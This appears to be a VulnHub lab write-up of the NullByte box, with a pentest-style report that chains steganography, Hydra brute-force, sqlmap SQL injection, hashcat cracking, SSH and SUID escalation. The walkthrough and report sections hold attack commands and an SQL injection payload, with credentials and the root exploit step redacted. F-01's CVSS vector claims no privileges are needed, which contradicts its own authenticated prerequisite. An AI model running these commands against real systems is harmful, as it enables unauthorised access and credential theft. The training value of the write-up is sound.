# NullByte

**Platform:** VulnHub
**OS:** Linux
**Tags:** Steganography, SQL Injection, Hydra, Hash Cracking, SUID
**Date:** 2026-05-04

Steganography in an image reveals a hidden directory path; SQL injection and hash cracking give SSH access. A SUID binary gives root.

## 1. Enumeration

Identified the target on the network and ran a full port and service scan.

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

Findings:
- 80/tcp - HTTP, Apache web server
- 777/tcp - SSH running on non-standard port
- 3306/tcp - MySQL database

## 2. Steganography

Browsed the web server and found a simple page with an image. Closer inspection revealed a hidden message embedded inside the image using steganography.

```bash
exiftool main.gif
strings main.gif
```

**Hidden string found in image metadata, pointing to a URL path.**

## 3. Directory Enumeration and Login Brute-Force

Used the hint from the image to find a hidden endpoint. Set up Burp Suite to intercept traffic and identify the login form structure, then used Hydra to brute-force credentials.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/path/login.php:user=^USER^&pass=^PASS^:invalid"
```

**Valid credentials found. Logged into the application.**

## 4. SQL Injection

After logging in, discovered a parameter in the application vulnerable to SQL injection. Extracted sensitive data including a hashed password.

```bash
sqlmap -u "http://<TARGET_IP>/path/page.php?param=1" --dbs
sqlmap -u "http://<TARGET_IP>/path/page.php?param=1" -D <dbname> --tables --dump
```

**Password hash extracted from database.**

Cracked the hash offline:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Hash cracked. Plaintext password recovered.**

## 5. SSH Access

Used the cracked credentials to authenticate via SSH on the non-standard port 777.

```bash
ssh -p 777 <user>@<TARGET_IP>
```

**Low-privileged user shell obtained.**

## 6. Privilege Escalation: SUID Binary

Searched for SUID binaries to find a privesc path.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Found a misconfigured SUID binary. Leveraged it to escalate to root.

**Root access obtained. Machine complete.**

Key Takeaway: This box chains multiple techniques: steg - web brute-force - SQLi - hash crack - SSH - SUID. Each stage feeds the next. Real engagements often look like this, a chain of small wins rather than one big exploit.

---

## Penetration Test Report

**Target:** nullbyte.local
**Address:** <TARGET_IP>
**Assessment type:** Web application & Linux host assessment
**Assessment date:** 4 May 2026
**Environment:** VulnHub laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 09

---

## 1. Executive Summary

### Assessment outcome

Testing identified two high and one low severity finding affecting the NullByte host. The assessment chain progressed through steganographic information disclosure, web login brute-force, SQL injection for credential extraction, SSH access via the recovered credentials, and root access through a misconfigured SUID binary.
A hidden string in an image on the web server pointed to a concealed URL path. Brute-forcing that endpoint's login form with Hydra yielded valid credentials. A web parameter in the authenticated area was vulnerable to SQL injection, from which a hashed user password was extracted and cracked offline. SSH access on the non-standard port 777 provided a low-privileged shell. A SUID binary was subsequently exploited to reach root.

### Impact

The full chain from unauthenticated web visitor to root demonstrates multiple compounding weaknesses. Root access permits modification of all accounts, configuration and files on the host.

### Priority recommendations

1. Remediate the SQL injection vulnerability by using parameterised queries; implement prepared statements across all database interactions.
2. Remove sensitive path information from embedded image metadata.
3. Audit and remove unnecessary SUID bits; replace the escalation vector with a least-privilege alternative.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| nullbyte.local | <TARGET_IP> | Linux host; Apache web server; MySQL; SSH on non-standard port |
| Port | Service | Observed detail |
| --- | --- | --- |
| 80/tcp | HTTP | Apache web server; image-based landing page |
| 777/tcp | SSH | OpenSSH on non-standard port |
| 3306/tcp | MySQL | Database service |

```
nmap -sC -sV -p- -T4 <TARGET_IP>

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
777/tcp  open  ssh     OpenSSH
3306/tcp open  mysql   MySQL
```

SSH running on port 777 rather than the standard port 22. Full port scan was required to identify this service.

### 2.2 Approach

Web investigation found an image on the landing page. Metadata extraction revealed a hidden URL path. Directory enumeration and login brute-force with Hydra provided access to the authenticated web area. SQL injection via sqlmap extracted password hashes from the database. Hashes were cracked offline with hashcat. SSH authenticated on port 777. SUID binary search identified the privilege escalation path.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | SQL injection in authenticated web parameter; password hash extracted | **High** | 6 |
| [F-02](#f-02) | Sensitive URL path disclosed via steganographic image metadata | **Low** | 7 |
| [F-03](#f-03) | SUID binary misconfiguration allows privilege escalation to root | **High** | 8 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Extracted hidden URL path from image metadata using exiftool/strings. | Hidden endpoint identified |
| 02 | Brute-forced login form with Hydra using the rockyou wordlist. | Authenticated web session |
| 03 | Used sqlmap to extract password hash from database via SQL injection. | Password hash recovered |
| 04 | Cracked hash offline with hashcat; authenticated via SSH on port 777. | Low-privileged user shell |
| 05 | Identified SUID binary and escalated to root. | Root shell |

## 4.1 SQL Injection in Authenticated Web Parameter

### F-01   SQL injection yields password hash extraction - HIGH

| Field | Assessment |
| --- | --- |
| Description | A web parameter in the authenticated section of the application was not sanitised before being passed to a database query. Sqlmap identified the injection point, enumerated the available databases, and dumped table contents. A hashed password for a system user was extracted. The hash was cracked offline using hashcat and rockyou.txt, providing the credentials used for SSH login on port 777. |
| Prerequisites | Authenticated session on the web application. Login credentials obtained via brute-force after steganographic path disclosure (F-02). |
| Impact | Extraction of all database contents accessible to the application's database account, including credential hashes. Cracked hash enabled SSH authentication as a system user. |
| Affected system | <TARGET_IP>:80 Authenticated web parameter (POST/GET) |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) : Improper Neutralisation of Special Elements used in an SQL Command |

### Steps to reproduce

1. Navigate to the discovered login form (identified via steganographic path disclosure).
2. Test for SQL injection: enter `' OR 1=1-- -` in the username field.
3. Use sqlmap: `sqlmap -u "http://<TARGET_IP>/<path>/index.php" --forms --dump` .
4. Extract user credentials from the database.
5. Crack any hashes with hashcat.

### Evidence

```
# Enumerate databases
sqlmap -u "http://<TARGET_IP>/path/page.php?param=1" --dbs

available databases:
[*] information_schema
[*] [application database]

# Dump user table
sqlmap -u "http://<TARGET_IP>/path/page.php?param=1" \
  -D [database] --tables --dump

[password hash extracted - value redacted]

# Offline hash cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
[redacted]   ([username])

# SSH login with cracked credentials
ssh -p 777 <user>@<TARGET_IP>
[user]@NullByte:~$ id
uid=1000([user]) gid=1000([user]) groups=1000([user])
```

Evidence E-01. SQL injection confirmed by sqlmap; password hash extracted from database. Hash and plaintext password redacted.

### Remediation

Replace all dynamic SQL queries with parameterised statements or prepared statements. Apply input validation to reject unexpected data types and lengths at the application layer. Restrict the database account to the minimum permissions required; it should not have access to the information_schema or other databases beyond the application's own. Implement a web application firewall to detect and block SQL injection patterns.

## 4.2 Sensitive Path Disclosed via Steganographic Image Metadata

### F-02   Hidden URL path in image metadata - LOW

| Field | Assessment |
| --- | --- |
| Description | An image served on the web server's landing page contained a hidden string in its metadata. Inspecting the file with exiftool and strings revealed a URL path that pointed to a concealed endpoint containing a login form. This path was not linked from the visible application and was not listed in robots.txt, but was discoverable through image analysis. The disclosed path was used as the entry point for login brute-forcing. |
| Prerequisites | HTTP access to the web server. No authentication required to download and inspect the image. |
| Impact | Disclosure of a hidden application endpoint. This path served as the gateway to the SQL injection finding and the broader compromise chain. Without this disclosure, the attack chain would require directory brute-forcing of a larger wordlist to locate the hidden endpoint. |
| Affected system | <TARGET_IP>:80 `main.gif` (or equivalent image on landing page) |
| CVSS 3.1 | **5.3** (Medium) [AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| CWE | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) : Exposure of Sensitive Information to an Unauthorised Actor |

### Steps to reproduce

1. Download the image from the web application.
2. Run `exiftool image.png` to inspect metadata.
3. Observe a hidden string in the Comment field pointing to a hidden path.
4. Navigate to `http://<TARGET_IP>/<hidden_path>/` to discover the login form.

### Evidence

```
exiftool main.gif
Comment: [hidden URL path redacted]

strings main.gif | tail -5
[hidden URL path redacted]
```

Evidence E-02. Hidden path recovered from image metadata using exiftool and strings. Path value redacted.

### Remediation

Strip metadata from all images served by the application using a tool such as exiftool or ImageMagick before deployment. Review existing deployed images for embedded metadata. Implement a build or deployment pipeline step that automatically strips metadata from media assets.

## 4.3 SUID Binary Misconfiguration

### F-03   SUID binary allows escalation to root - HIGH

| Field | Assessment |
| --- | --- |
| Description | Enumeration of SUID binaries identified a file with the SUID bit set and root as the owner. The binary was exploited to execute commands as root, escalating from a low-privileged user account obtained through the SSH login (following F-01 and F-02) to full root access on the host. |
| Prerequisites | Low-privileged user shell on the host. Obtained through the preceding attack chain. |
| Impact | Privilege escalation to root. Full control of the operating system, all accounts, files and services. |
| Affected system | SUID binary identified via: `find / -perm -u=s -type f 2>/dev/null` |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-250](https://cwe.mitre.org/data/definitions/250.html) : Execution with Unnecessary Privileges |

### Steps to reproduce

1. From the user shell, find SUID binaries: `find / -perm -4000 -type f 2>/dev/null` .
2. Identify the vulnerable binary.
3. Use the appropriate GTFOBins technique to escalate privileges.
4. Confirm root: `id` .

### Evidence

```
[user]@NullByte:~$ find / -perm -u=s -type f 2>/dev/null
[SUID binary path identified]

[user]@NullByte:~$ [exploitation command]

# id
uid=0(root) gid=0(root) groups=0(root)
```

Evidence E-03. SUID binary identified via standard find command. Exploit yielded root shell. Specific binary and exploitation technique recorded during assessment.

### Remediation

Run `find / -perm -u=s -type f 2>/dev/null` and review each SUID binary. Remove the SUID bit from any binary that does not require root privileges for its intended function using `chmod u-s [binary]` . Maintain a baseline inventory of authorised SUID binaries and alert on deviations. Where a function requires elevated privileges, implement it as a controlled service rather than a SUID binary where possible.

### Verification

Confirm that the SUID bit is absent from the identified binary. Verify that running the binary as an unprivileged user does not yield elevated access.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Parameterise all SQL queries to eliminate the injection vulnerability. | F-01 |
| High | Remove SUID bit from misconfigured binary; audit all SUID binaries. | F-03 |
| Medium | Strip metadata from all deployed images; implement automated stripping in the build pipeline. | F-02 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Evidence and limitations

Evidence blocks are sourced from the [NullByte assessment walkthrough](nullbyte-vh.html) . Password hashes, plaintext passwords and flag values are redacted. The specific SUID binary name is retained in the tester's assessment record but is not reproduced here to avoid serving as a direct exploitation guide.

### 5.3 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 4: SQL injection and hash extraction |
| E-02 | Walkthrough section 2: Steganographic path disclosure |
| E-03 | Walkthrough section 6: SUID binary privilege escalation |
